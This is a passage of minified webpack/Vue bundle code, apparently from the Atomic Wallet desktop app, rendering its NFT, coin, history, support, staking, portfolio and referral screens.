const { config } = require("process");

(this["webpackJsonp"] = this["webpackJsonp"] || []).push([
  [144],
  {
    1247: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "main",
            [
              !e.isOpenPopup && e.allNft.length
                ? i("NFTGallery", {
                    attrs: { "data-test-id": "nft_gallery" },
                    on: {
                      toggleInfo: e.toggleInfo,
                      toggleReceivePopup: e.toggleReceivePopup,
                    },
                  })
                : e._e(),
              e._v(" "),
              e.isOpenPopup || 0 !== e.allNft.length
                ? e._e()
                : i("NFTEmpty", {
                    attrs: {
                      isLoading: e.isLoading,
                      "data-test-id": "nft_empty",
                    },
                    on: { openReceivePopup: e.toggleReceivePopup },
                  }),
              e._v(" "),
              e.showInfoPopup
                ? i("NFTInfo", {
                    attrs: { nft: e.selectedNFT, "data-test-id": "nft_info" },
                    on: {
                      onShowSendPopup: e.toggleSendPopup,
                      onClose: function (t) {
                        e.showInfoPopup = !1;
                      },
                    },
                  })
                : e._e(),
              e._v(" "),
              e.showReceivePopup
                ? i("NFTReceive", { on: { onClose: e.toggleReceivePopup } })
                : e._e(),
              e._v(" "),
              e.showSendPopup
                ? i("NFTSendToken", {
                    attrs: { token: e.selectedNFT },
                    on: { close: e.toggleSendPopup, closeAll: e.closeAll },
                  })
                : e._e(),
            ],
            1
          );
        },
        s = [];
    },
    1285: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "main",
            [
              i(
                "KeepAlive",
                { attrs: { max: "5" } },
                [i("TableCoins", { on: { editToken: e.editToken } })],
                1
              ),
              e._v(" "),
              i(
                "div",
                { staticClass: "add-token", on: { click: e.toggleTokenPopup } },
                [e._v("\n    +\n  ")]
              ),
              e._v(" "),
              i("RefreshButton"),
              e._v(" "),
              i(
                "transition",
                { attrs: { mode: "out-in", name: "page-fade" } },
                [
                  e.showTokenPopup
                    ? i("TokenAddTabs", {
                        attrs: {
                          coin: e.coinTokenPopup,
                          isEditToken: e.isEditToken,
                        },
                        on: { closeTokenPopup: e.closeTokenPopup },
                      })
                    : e._e(),
                ],
                1
              ),
            ],
            1
          );
        },
        s = [];
    },
    1289: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            {
              staticClass: "history scroll-list2",
              on: { scroll: e.handleScrollEnd },
            },
            [
              e.loadingPromise && e.isEmpty
                ? i("div", { staticClass: "history__loading" }, [
                    i("div", { staticClass: "loading" }),
                  ])
                : e._e(),
              e._v(" "),
              e.isEmpty
                ? e._e()
                : i("Search", {
                    staticClass: "history-search-fix",
                    model: {
                      value: e.filter,
                      callback: function (t) {
                        e.filter = t;
                      },
                      expression: "filter",
                    },
                  }),
              e._v(" "),
              e.settingsState && e.isEmpty
                ? e._e()
                : i(
                    "Table",
                    {
                      attrs: {
                        filter: e.filter,
                        header: e.header,
                        isEmpty: e.isEmpty,
                        items: e.transactions,
                      },
                    },
                    [
                      e.filter.length && !e.transactions.length
                        ? i(
                            "div",
                            { attrs: { slot: "empty" }, slot: "empty" },
                            [
                              i("div", { staticClass: "empty" }, [
                                e._v(
                                  "No results found for “" +
                                    e._s(e.filter) +
                                    "”"
                                ),
                              ]),
                            ]
                          )
                        : e._e(),
                      e._v(" "),
                      i("div", {
                        staticClass: "refresh-btn icon-refresh",
                        class: { "refresh-btn--updating": e.loadingPromise },
                        attrs: { slot: "header-row-2" },
                        on: { click: e.updateHistory },
                        slot: "header-row-2",
                      }),
                      e._v(" "),
                      i("FilterButton", {
                        attrs: {
                          slot: "header-row-2",
                          active: e.settingsState,
                          highlight: e.highlightSetting,
                        },
                        on: {
                          click: function (t) {
                            e.settingsState = !e.settingsState;
                          },
                        },
                        slot: "header-row-2",
                      }),
                      e._v(" "),
                      i("ExportButton", {
                        attrs: { slot: "header-row-2" },
                        on: { click: e.exportHistory },
                        slot: "header-row-2",
                      }),
                      e._v(" "),
                      e._l(e.transactions, function (t, a) {
                        return i("HistoryTableRow", {
                          key: "row-" + a + "-" + Math.random(),
                          attrs: {
                            slot: "table-rows",
                            indexTx: a,
                            openedIds: e.openedIds,
                            tx: t,
                          },
                          on: {
                            addOpenedId: e.addOpenedId,
                            removeOpenedId: e.removeOpenedId,
                          },
                          slot: "table-rows",
                        });
                      }),
                    ],
                    2
                  ),
              e._v(" "),
              e.isEmpty
                ? i("BuyBitcoin", {
                    attrs: { name: "transactions" },
                    scopedSlots: e._u(
                      [
                        {
                          key: "text",
                          fn: function () {
                            return [
                              i("div", { staticClass: "history__requested" }, [
                                i(
                                  "div",
                                  { staticClass: "history__requested-update" },
                                  [
                                    i("p", [
                                      e._v(
                                        "Your transaction history will appear here"
                                      ),
                                    ]),
                                    e._v(" "),
                                    i("p", [
                                      e._v(
                                        "\n            To see your new transactions, please click\n            "
                                      ),
                                      i(
                                        "span",
                                        { on: { click: e.updateHistory } },
                                        [e._v(" update. ")]
                                      ),
                                    ]),
                                  ]
                                ),
                              ]),
                            ];
                          },
                          proxy: !0,
                        },
                      ],
                      null,
                      !1,
                      689015126
                    ),
                  })
                : e._e(),
              e._v(" "),
              e.isSavedTransactionPopup
                ? i("div", { staticClass: "saved-transaction popup fixed" }, [
                    i("div", {
                      staticClass: "popup-background",
                      on: {
                        click: function (t) {
                          e.isSavedTransactionPopup = !1;
                        },
                      },
                    }),
                    e._v(" "),
                    i("div", { staticClass: "popup-wrap" }, [
                      i(
                        "div",
                        { staticClass: "success-icon" },
                        [i("SuccessIconBig")],
                        1
                      ),
                      e._v(" "),
                      i("div", { staticClass: "text-title" }, [
                        e._v("Transactions are saved to your Desktop folder."),
                      ]),
                      e._v(" "),
                      i(
                        "button",
                        {
                          staticClass: "button uppercase",
                          on: {
                            click: function (t) {
                              e.isSavedTransactionPopup = !1;
                            },
                          },
                        },
                        [e._v("\n        Close\n      ")]
                      ),
                    ]),
                  ])
                : e._e(),
              e._v(" "),
              i(
                "transition",
                { attrs: { name: "fade" } },
                [
                  e.settingsState
                    ? i("FilterPopup", {
                        attrs: {
                          coins: e.coinsInvolvedInHistory,
                          directions: "",
                          module: "history",
                        },
                        on: {
                          acceptFilter: e.acceptFilter,
                          close: function (t) {
                            e.settingsState = !1;
                          },
                        },
                      })
                    : e._e(),
                ],
                1
              ),
            ],
            1
          );
        },
        s = [];
    },
    1290: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            a = e._self._c || t;
          return a("main", [
            a("div", { staticClass: "support" }, [
              a("div", { staticClass: "title" }, [
                e._v("Atomic Wallet Support"),
              ]),
              e._v(" "),
              a("p", { staticClass: "support__text" }, [
                e._v("Update your wallet to the latest version:"),
              ]),
              e._v(" "),
              a(
                "a",
                {
                  staticClass: "hover",
                  attrs: { "data-test-id": "support_download_link" },
                  on: {
                    click: function (t) {
                      return e.$electron.openExternal(
                        "https://atomicwallet.io/downloads"
                      );
                    },
                  },
                },
                [e._v("atomicwallet.io/downloads")]
              ),
              e._v(" "),
              a("div", { staticClass: "row" }, [
                a(
                  "a",
                  {
                    on: {
                      click: function (t) {
                        return e.$electron.openExternal(
                          "https://support.atomicwallet.io"
                        );
                      },
                    },
                  },
                  [a("img", { attrs: { src: i(2287) } }), e._v(" "), e._m(0)]
                ),
                e._v(" "),
                a(
                  "a",
                  {
                    on: {
                      click: function (t) {
                        return e.$bus.$emit(
                          "openSupportPopup",
                          e.contactSupport
                        );
                      },
                    },
                  },
                  [a("img", { attrs: { src: i(2288) } }), e._v(" "), e._m(1)]
                ),
                e._v(" "),
                a(
                  "a",
                  {
                    on: {
                      click: function (t) {
                        return e.$electron.openExternal(
                          "https://www.youtube.com/atomicwallet"
                        );
                      },
                    },
                  },
                  [a("img", { attrs: { src: i(2289) } }), e._v(" "), e._m(2)]
                ),
              ]),
              e._v(" "),
              a("div", { staticClass: "social-networks" }, [
                a("p", { staticClass: "support__text" }, [
                  e._v("Check out our social media"),
                ]),
                e._v(" "),
                a(
                  "a",
                  {
                    attrs: { "data-test-id": "support_telegram_link" },
                    on: {
                      click: function (t) {
                        return e.$electron.openExternal(
                          "https://t.me/AtomicWalletNews"
                        );
                      },
                    },
                  },
                  [a("img", { attrs: { src: i(2178) } })]
                ),
                a(
                  "a",
                  {
                    attrs: { "data-test-id": "support_reddit_link" },
                    on: {
                      click: function (t) {
                        return e.$electron.openExternal(
                          "https://www.reddit.com/r/atomicwallet/"
                        );
                      },
                    },
                  },
                  [a("img", { attrs: { src: i(2174) } })]
                ),
                a(
                  "a",
                  {
                    attrs: { "data-test-id": "support_twitter_link" },
                    on: {
                      click: function (t) {
                        return e.$electron.openExternal(
                          "https://twitter.com/atomicwallet"
                        );
                      },
                    },
                  },
                  [a("img", { attrs: { src: i(2179) } })]
                ),
                a(
                  "a",
                  {
                    attrs: { "data-test-id": "support_facebook_link" },
                    on: {
                      click: function (t) {
                        return e.$electron.openExternal(
                          "https://www.facebook.com/atomicwallet"
                        );
                      },
                    },
                  },
                  [a("img", { attrs: { src: i(2162) } })]
                ),
              ]),
              e._v(" "),
              a(
                "p",
                {
                  staticClass: "support__text cursor",
                  on: {
                    click: function (t) {
                      return e.$copyToClipboard(e.$wallets.hash);
                    },
                  },
                },
                [e._v("\n      Anonymous Atomic ID\n    ")]
              ),
              e._v(" "),
              a("div", { staticClass: "copy-wrap" }, [
                a(
                  "a",
                  {
                    attrs: { "data-test-id": "support_atomic_id" },
                    on: {
                      click: function (t) {
                        return e.$copyToClipboard(e.$wallets.hash);
                      },
                    },
                  },
                  [
                    e._v(
                      "\n        " +
                        e._s(
                          e._f("$formatTextTrimMiddle")(e.$wallets.hash, 14)
                        ) +
                        "\n      "
                    ),
                  ]
                ),
                e._v(" "),
                a("div", {
                  staticClass: "icon-copy",
                  on: {
                    click: function (t) {
                      return e.$copyToClipboard(e.$wallets.hash);
                    },
                  },
                }),
              ]),
              e._v(" "),
              a(
                "div",
                { staticClass: "relative" },
                [
                  a("transition", { attrs: { name: "fade" } }, [
                    e.isCopiedToClipboard
                      ? a("div", { staticClass: "message" }, [
                          e._v(
                            "\n          Atomic ID copied to clipboard\n        "
                          ),
                        ])
                      : e._e(),
                  ]),
                ],
                1
              ),
              e._v(" "),
              a("div", { staticClass: "enable-logs" }, [
                a(
                  "label",
                  {
                    staticClass: "checkbox",
                    attrs: { "data-test-id": "support_enable_logs" },
                  },
                  [
                    a("input", {
                      directives: [
                        {
                          name: "model",
                          rawName: "v-model",
                          value: e.enableMonitoring,
                          expression: "enableMonitoring",
                        },
                      ],
                      attrs: { type: "checkbox" },
                      domProps: {
                        checked: Array.isArray(e.enableMonitoring)
                          ? e._i(e.enableMonitoring, null) > -1
                          : e.enableMonitoring,
                      },
                      on: {
                        change: function (t) {
                          var i = e.enableMonitoring,
                            a = t.target,
                            s = !!a.checked;
                          if (Array.isArray(i)) {
                            var n = null,
                              o = e._i(i, n);
                            a.checked
                              ? o < 0 && (e.enableMonitoring = i.concat([n]))
                              : o > -1 &&
                                (e.enableMonitoring = i
                                  .slice(0, o)
                                  .concat(i.slice(o + 1)));
                          } else e.enableMonitoring = s;
                        },
                      },
                    }),
                    a("span", [e._v(" Enable log collection ")]),
                    e._v(" "),
                    e._m(3),
                  ]
                ),
              ]),
            ]),
          ]);
        },
        s = [
          function () {
            var e = this,
              t = e.$createElement,
              i = e._self._c || t;
            return i("span", [e._v(" Knowledge"), i("br"), e._v("Base ")]);
          },
          function () {
            var e = this,
              t = e.$createElement,
              i = e._self._c || t;
            return i("span", [e._v(" Contact"), i("br"), e._v("Support ")]);
          },
          function () {
            var e = this,
              t = e.$createElement,
              i = e._self._c || t;
            return i("span", [e._v(" Video"), i("br"), e._v("Tutorials ")]);
          },
          function () {
            var e = this,
              t = e.$createElement,
              a = e._self._c || t;
            return a("div", { staticClass: "state tooltip-hover" }, [
              a("img", { staticClass: "icon", attrs: { src: i(2290) } }),
              e._v(" "),
              a("div", { staticClass: "tooltip" }, [
                e._v(
                  "\n            Atomic Wallet will automatically collect error details to improve your experience."
                ),
                a("br"),
                e._v(
                  "We\n            respect your privacy, so this data is fully anonymous and will help our support"
                ),
                a("br"),
                e._v(
                  "\n            team resolve any issues you may encounter."
                ),
                a("br"),
                e._v(
                  "\n            If you still prefer not to share your data, disable this option.\n          "
                ),
              ]),
            ]);
          },
        ];
    },
    1330: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            a = e._self._c || t;
          return a(
            "div",
            {
              staticClass: "staking scroll-list2",
              attrs: { "data-test-id": "coin_staking_info" },
            },
            [
              e.activeStaking
                ? a("StakingPopupTabs", {
                    attrs: { staking: e.activeStaking },
                    on: { closePopup: e.closeExchangePopup },
                  })
                : e.isEmptyScreen
                ? a("StakingEmpty", {
                    attrs: { items: e.tableItems },
                    on: { openStakingPopup: e.openExchangePopup },
                  })
                : [
                    a("Search", {
                      staticClass: "table-search-fix",
                      model: {
                        value: e.searchInput,
                        callback: function (t) {
                          e.searchInput = t;
                        },
                        expression: "searchInput",
                      },
                    }),
                    e._v(" "),
                    a(
                      "Table",
                      {
                        attrs: {
                          activeSortField: e.activeSortField,
                          header: e.header,
                          isEmpty: !1,
                          isSortASC: e.isSortASC,
                          isSortable: !0,
                          items: e.tableItems,
                        },
                        on: { sortByField: e.sortByField },
                      },
                      [
                        !e.tableItems.length && e.searchInput
                          ? a(
                              "div",
                              {
                                staticClass: "no-result",
                                attrs: { slot: "empty" },
                                slot: "empty",
                              },
                              [
                                a("div", [
                                  a("img", {
                                    staticClass: "icon-search",
                                    attrs: {
                                      src: i(885),
                                      width: "24",
                                      height: "24",
                                    },
                                  }),
                                ]),
                                e._v(" "),
                                a("h3", { staticClass: "new-text-large" }, [
                                  e._v("No items found"),
                                ]),
                                e._v(" "),
                                a(
                                  "p",
                                  {
                                    staticClass:
                                      "new-text-medium2 new-text-gray",
                                  },
                                  [e._v("Try with a different search keyword.")]
                                ),
                              ]
                            )
                          : e._e(),
                        e._v(" "),
                        e._l(e.tableItems, function (t, i) {
                          return a(
                            "div",
                            {
                              key: t.ticker + "-" + i,
                              staticClass:
                                "table-row with-hover flex-wrap center",
                              attrs: { slot: "table-rows" },
                              on: {
                                click: function (i) {
                                  return e.handleClick(t);
                                },
                              },
                              slot: "table-rows",
                            },
                            [
                              a("div", { staticClass: "item" }, [
                                a(
                                  "div",
                                  { staticClass: "flex-wrap center" },
                                  [
                                    a("CoinIcon", {
                                      attrs: { wallet: t.walletInstance },
                                    }),
                                    e._v(" "),
                                    a("div", { staticClass: "m-l-10 info" }, [
                                      a(
                                        "div",
                                        [
                                          a(
                                            "AtomicNotifyPoint",
                                            {
                                              attrs: {
                                                UID:
                                                  "staking-table-ticker-" +
                                                  t.ticker,
                                              },
                                            },
                                            [
                                              a(
                                                "p",
                                                {
                                                  staticClass:
                                                    "new-title-medium",
                                                },
                                                [
                                                  e._v(
                                                    "\n                    " +
                                                      e._s(t.name) +
                                                      "\n                  "
                                                  ),
                                                ]
                                              ),
                                              e._v(" "),
                                              e._l(t.tags, function (t) {
                                                return a(
                                                  "div",
                                                  {
                                                    key: t,
                                                    staticClass:
                                                      "tag tag--staking",
                                                  },
                                                  [
                                                    a(
                                                      "div",
                                                      {
                                                        class:
                                                          "--" +
                                                          t +
                                                          " new-text-medium2",
                                                      },
                                                      [
                                                        e._v(
                                                          "\n                      " +
                                                            e._s(t) +
                                                            "\n                    "
                                                        ),
                                                      ]
                                                    ),
                                                  ]
                                                );
                                              }),
                                            ],
                                            2
                                          ),
                                        ],
                                        1
                                      ),
                                      e._v(" "),
                                      a(
                                        "div",
                                        {
                                          staticClass:
                                            "new-text-gray2 new-text-small",
                                        },
                                        [
                                          e._v(
                                            "\n                " +
                                              e._s(t.displayTicker) +
                                              "\n              "
                                          ),
                                        ]
                                      ),
                                    ]),
                                  ],
                                  1
                                ),
                              ]),
                              e._v(" "),
                              a(
                                "div",
                                { staticClass: "item new-text-medium2" },
                                [
                                  a("span", {
                                    directives: [
                                      {
                                        name: "text-html",
                                        rawName: "v-text-html",
                                        value: e.fiatCharacter,
                                        expression: "fiatCharacter",
                                      },
                                    ],
                                    staticClass: "new-text-medium2",
                                  }),
                                  e._v(
                                    e._s(
                                      e._f("formatFiatV2")(
                                        t.fiatBalance,
                                        e.fiatRate
                                      )
                                    ) + "\n        "
                                  ),
                                ]
                              ),
                              e._v(" "),
                              a(
                                "div",
                                { staticClass: "item new-text-medium2" },
                                [
                                  a("span", {
                                    directives: [
                                      {
                                        name: "text-html",
                                        rawName: "v-text-html",
                                        value: e.fiatCharacter,
                                        expression: "fiatCharacter",
                                      },
                                    ],
                                    staticClass: "new-text-medium2",
                                  }),
                                  e._v(
                                    e._s(
                                      e._f("formatFiatV2")(
                                        t.fiatStaked,
                                        e.fiatRate
                                      )
                                    ) + "\n        "
                                  ),
                                ]
                              ),
                              e._v(" "),
                              a(
                                "div",
                                { staticClass: "item new-text-medium2" },
                                [
                                  e._v(
                                    "\n          " +
                                      e._s(t.reward ? t.reward + "%" : "") +
                                      "\n        "
                                  ),
                                ]
                              ),
                            ]
                          );
                        }),
                      ],
                      2
                    ),
                  ],
            ],
            2
          );
        },
        s = [];
    },
    1331: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i("main", { staticClass: "settings" }, [
            i(
              "div",
              { staticClass: "header-tabs" },
              e._l(e.tabs, function (t) {
                return i(
                  "router-link",
                  {
                    key: t.name,
                    staticClass: "choice",
                    attrs: {
                      to: { name: t.name },
                      exactActiveClass: "active",
                      tag: "div",
                    },
                    nativeOn: {
                      click: function (t) {
                        return e.clickHandler.apply(null, arguments);
                      },
                    },
                  },
                  [
                    i(
                      "AtomicNotifyPoint",
                      { attrs: { UID: "settings-header-tabs-" + t.name } },
                      [
                        i("span", [
                          e._v("\n          " + e._s(t.title) + "\n        "),
                        ]),
                      ]
                    ),
                  ],
                  1
                );
              }),
              1
            ),
            e._v(" "),
            i("div", { staticClass: "content" }, [i("router-view")], 1),
          ]);
        },
        s = [];
    },
    1333: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "main",
            { staticClass: "portfolio" },
            [
              e.chartData
                ? e.sortedTableItems.length
                  ? i(
                      "div",
                      { staticClass: "wallet-table scroll-list2" },
                      [
                        i("DonutChart", { attrs: { data: e.chartData } }),
                        e._v(" "),
                        i(
                          "Table",
                          {
                            attrs: {
                              activeSortField: e.activeSortField,
                              excludedFields: e.excludedFields,
                              header: e.header,
                              isEmpty: !1,
                              isSortASC: e.isSortASC,
                              isSortable: !0,
                              items: e.sortedTableItems,
                              spaceBetween: !0,
                            },
                            on: { sortByField: e.sortByField },
                          },
                          e._l(e.sortedTableItems, function (t, a) {
                            return i("Coin", {
                              key: a + "-coin-" + t.ticker,
                              ref: t.ticker + "-" + t.deprecatedParent,
                              refInFor: !0,
                              attrs: {
                                slot: "table-rows",
                                coin: t,
                                isPortfolio: !0,
                                "data-test-id": "portfolio_coin",
                              },
                              on: {
                                toggleCoinInfoPopup: e.toggleCoinInfoPopup,
                                changeCoin: e.changeActiveCoin,
                              },
                              slot: "table-rows",
                            });
                          }),
                          1
                        ),
                      ],
                      1
                    )
                  : i("BuyBitcoin", { attrs: { name: "portfolio" } })
                : i("div", { staticClass: "loading portfolio__loading" }),
              e._v(" "),
              i(
                "transition",
                { attrs: { mode: "out-in", name: "page-fade" } },
                [
                  e.showCoinInfoPopup && !e.showSendCoinPopup
                    ? i("CoinInfo", {
                        key: "coinInfo",
                        attrs: { coin: e.activeCoin },
                        on: {
                          closePopup: e.closeCoinInfoPopup,
                          editToken: e.editToken,
                          changeCoin: e.changeActiveCoin,
                          toggleReceiveCoin: e.toggleReceiveCoinPopup,
                          toggleSendCoin: e.toggleSendCoinPopup,
                        },
                      })
                    : e._e(),
                ],
                1
              ),
              e._v(" "),
              i(
                "transition",
                { attrs: { mode: "out-in", name: "page-fade" } },
                [
                  e.showSendCoinPopup
                    ? i("SendCoin", {
                        key: "sendCoin",
                        attrs: { coin: e.activeCoin },
                        on: {
                          changeCoin: e.changeActiveCoin,
                          closePopup: e.closeSendCoinPopup,
                        },
                      })
                    : e._e(),
                ],
                1
              ),
              e._v(" "),
              i(
                "transition",
                { attrs: { mode: "out-in", name: "page-fade" } },
                [
                  e.showReceiveCoinPopup
                    ? i("ReceiveCoin", {
                        key: "receiveCoin",
                        attrs: { coin: e.activeCoin },
                        on: {
                          changeCoin: e.changeActiveCoin,
                          closePopup: e.closeReceiveCoinPopup,
                        },
                      })
                    : e._e(),
                ],
                1
              ),
            ],
            1
          );
        },
        s = [];
    },
    1335: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i("div", { staticClass: "invite-friends__landing" }, [
            i("div", { staticClass: "invite-friends__landing__body" }, [
              e._m(0),
              e._v(" "),
              i(
                "section",
                { staticClass: "invite-friends__landing__body__content" },
                [
                  i("AtomicLinkedCard", {
                    attrs: { linkedCardData: e.cardsOptions },
                  }),
                ],
                1
              ),
            ]),
            e._v(" "),
            i("div", { staticClass: "invite-friends__landing__control" }, [
              i(
                "button",
                {
                  staticClass:
                    "new-button new-button-large new-button-yellow new-button-max300 new-button-bold",
                  on: { click: e.makeEarning },
                },
                [e._v("\n      Start earning\n    ")]
              ),
            ]),
          ]);
        },
        s = [
          function () {
            var e = this,
              t = e.$createElement,
              a = e._self._c || t;
            return a(
              "section",
              { staticClass: "invite-friends__landing__body__header" },
              [
                a("img", {
                  attrs: {
                    src: i(2293),
                    height: "66",
                    width: "283",
                    alt: "Invite friends",
                  },
                }),
                e._v(" "),
                a("img", {
                  attrs: {
                    src: i(2294),
                    height: "66",
                    width: "440",
                    alt: "Earn crypto together",
                  },
                }),
              ]
            );
          },
        ];
    },
    1338: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "invite-friends__dashboard-tab" },
            [
              i(
                "div",
                { staticClass: "invite-friends__dashboard-tab__stats" },
                [
                  e._m(0),
                  e._v(" "),
                  i(
                    "div",
                    {
                      staticClass: "invite-friends__dashboard-tab__stats__body",
                    },
                    e._l(e.infoGroup, function (t) {
                      return i(
                        "AtomicInfoGroup",
                        e._b({ key: t.label }, "AtomicInfoGroup", t, !1)
                      );
                    }),
                    1
                  ),
                ]
              ),
              e._v(" "),
              i("div", { staticClass: "invite-friends__dashboard-tab__code" }, [
                e._m(1),
                e._v(" "),
                i(
                  "div",
                  { staticClass: "invite-friends__dashboard-tab__code__body" },
                  [
                    i("h3", [e._v("Promo code")]),
                    e._v(" "),
                    i(
                      "div",
                      {
                        staticClass:
                          "invite-friends__dashboard-tab__code__body__content",
                      },
                      [
                        i(
                          "div",
                          { staticClass: "block__copy-wrap" },
                          [
                            i(
                              "ClipboardWrap",
                              {
                                attrs: {
                                  textToClipboard: e.promoCode,
                                  clipboardMessage:
                                    "Promo code copied to clipboard",
                                },
                              },
                              [
                                i(
                                  "div",
                                  {
                                    ref: "clipboard_value",
                                    staticClass: "block__copy",
                                  },
                                  [
                                    e._v(
                                      "\n              " +
                                        e._s(e.promoCode) +
                                        "\n            "
                                    ),
                                  ]
                                ),
                              ]
                            ),
                            e._v(" "),
                            i(
                              "div",
                              { staticClass: "block__copy-buttons" },
                              [
                                i(
                                  "AtomicButton",
                                  {
                                    on: {
                                      click: function (t) {
                                        return e.$copyToClipboard(e.link);
                                      },
                                    },
                                  },
                                  [e._v(" Copy link ")]
                                ),
                                e._v(" "),
                                i(
                                  "AtomicButton",
                                  {
                                    attrs: {
                                      type: "fucking_gray_button_which_is_using_in_one_place",
                                    },
                                    on: { click: e.openModal },
                                  },
                                  [e._v("\n              Share\n            ")]
                                ),
                                e._v(" "),
                                i("transition", { attrs: { name: "fade" } }, [
                                  e.isCopiedToClipboard
                                    ? i(
                                        "div",
                                        { staticClass: "message message-2" },
                                        [
                                          e._v(
                                            "\n                Link copied to clipboard\n              "
                                          ),
                                        ]
                                      )
                                    : e._e(),
                                ]),
                              ],
                              1
                            ),
                          ],
                          1
                        ),
                      ]
                    ),
                  ]
                ),
              ]),
              e._v(" "),
              i(
                "div",
                { staticClass: "invite-friends__dashboard-tab__how-it-works" },
                [
                  i(
                    "AtomicLink",
                    {
                      attrs: { type: "secondary" },
                      on: { click: e.openLinkHowWorks },
                    },
                    [e._v("\n      How it works?\n    ")]
                  ),
                ],
                1
              ),
              e._v(" "),
              e.socialLinksModal
                ? i(
                    "AtomicModal",
                    {
                      attrs: { title: "Share link" },
                      on: { close: e.closeModal },
                    },
                    [
                      i("div", { staticClass: "social-links" }, [
                        i("div", { staticClass: "title" }, [
                          e._v("Share link with your friends in one click"),
                        ]),
                        e._v(" "),
                        i(
                          "div",
                          { staticClass: "links" },
                          e._l(e.socialNetworks, function (t) {
                            return i("img", {
                              key: t.network,
                              attrs: { src: e.getIcon(t.icon) },
                              on: {
                                click: function (i) {
                                  return e.openShare(t.network);
                                },
                              },
                            });
                          }),
                          0
                        ),
                      ]),
                    ]
                  )
                : e._e(),
            ],
            1
          );
        },
        s = [
          function () {
            var e = this,
              t = e.$createElement,
              i = e._self._c || t;
            return i(
              "div",
              { staticClass: "invite-friends__dashboard-tab__stats__header" },
              [i("h2", [e._v("Your stats")])]
            );
          },
          function () {
            var e = this,
              t = e.$createElement,
              i = e._self._c || t;
            return i(
              "div",
              { staticClass: "invite-friends__dashboard-tab__code__header" },
              [i("h2", [e._v("Invite friends to install Atomic")])]
            );
          },
        ];
    },
    1339: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "invite-friends__dashboard__bonus-tab" },
            [
              i("h2", { staticClass: "explain" }, [
                e._v(
                  "\n    Make exchanges to receive AWC. When your exchange volume reaches\n    " +
                    e._s(e._f("toCurrency")(e.exchangeBonus.stages[0].volume)) +
                    ",\n    " +
                    e._s(e._f("toCurrency")(e.exchangeBonus.stages[1].volume)) +
                    ", and\n    " +
                    e._s(e._f("toCurrency")(e.exchangeBonus.stages[2].volume)) +
                    " you will receive AWC rewards.\n  "
                ),
              ]),
              e._v(" "),
              i(
                "div",
                { staticClass: "progress-bar" },
                [
                  i("AtomicRewardsBar", {
                    attrs: {
                      scaleLimits: e.getScaleLimits,
                      steps: e.getSteps,
                      value: e.getCurrentRewardValuePercent,
                      absValue: e.valueNum,
                    },
                  }),
                ],
                1
              ),
              e._v(" "),
              i("div", { staticClass: "go-to-exchange" }, [
                i("span", [
                  e._v(
                    "\n      " +
                      e._s(
                        e._f("toCurrency")(e.exchangeBonus.untilNextReward)
                      ) +
                      " of exchange volume left to the next reward\n    "
                  ),
                ]),
                e._v(" "),
                i(
                  "button",
                  {
                    staticClass:
                      "new-button new-button-yellow new-button-medium new-button-bold",
                    on: { click: e.goToExchange },
                  },
                  [e._v("\n      Exchange now\n    ")]
                ),
              ]),
            ]
          );
        },
        s = [];
    },
    1340: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "invite-friends__dashboard" },
            [
              e._m(0),
              e._v(" "),
              e.isReferral
                ? i(
                    "div",
                    { staticClass: "invite-friends__dashboard__tabs" },
                    [
                      i("AtomicTabs", {
                        attrs: {
                          tabs: ["INVITE FRIENDS", "MY EXCHANGE BONUS"],
                          align: "left",
                        },
                        model: {
                          value: e.activeTabIndex,
                          callback: function (t) {
                            e.activeTabIndex = t;
                          },
                          expression: "activeTabIndex",
                        },
                      }),
                    ],
                    1
                  )
                : e._e(),
              e._v(" "),
              0 === e.activeTabIndex ? i("DashboardTab") : e._e(),
              e._v(" "),
              1 === e.activeTabIndex ? i("BonusTab") : e._e(),
            ],
            1
          );
        },
        s = [
          function () {
            var e = this,
              t = e.$createElement,
              i = e._self._c || t;
            return i(
              "div",
              { staticClass: "invite-friends__dashboard__header" },
              [i("h1", [e._v("Invite Friends and Earn Rewards Together")])]
            );
          },
        ];
    },
    1341: function (e, t, i) {
      "use strict";
      i.d(t, "a", function () {
        return a;
      }),
        i.d(t, "b", function () {
          return s;
        });
      var a = function () {
          var e = this,
            t = e.$createElement,
            i = e._self._c || t;
          return i(
            "div",
            { staticClass: "invite-friends" },
            [
              e.isLoading
                ? i(
                    "div",
                    { staticClass: "flex align-center justify-center" },
                    [i("AtomicLoader")],
                    1
                  )
                : [e.isLanding ? i("InviteLanding") : i("InviteDashboard")],
            ],
            2
          );
        },
        s = [];
